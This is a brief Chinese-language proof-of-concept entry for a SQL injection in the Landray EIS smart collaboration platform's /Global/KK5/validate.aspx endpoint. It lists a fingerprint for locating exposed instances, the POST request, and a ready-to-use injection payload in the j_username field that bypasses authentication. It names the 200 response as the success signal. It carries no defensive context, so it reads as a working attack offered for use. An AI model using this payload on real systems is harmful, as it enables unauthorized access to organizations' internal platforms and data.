# 蓝凌EIS智慧协同平台validate存在SQL注入漏洞

蓝凌EIS智慧协同平台 ｜ SQL注入 ｜ —
- **指纹**：`body="/Scripts/jquery.landray.dialog.js"`
- **请求**：`POST /Global/KK5/validate.aspx HTTP/1.1`

**Payload**
```
{"j_username": "admin'or  1=CONVERT(VARCHAR(32),HASHBYTES('MD5','123456'),2)--+-", "j_password": "1", "method": "validate"}
```
- **响应特征**：200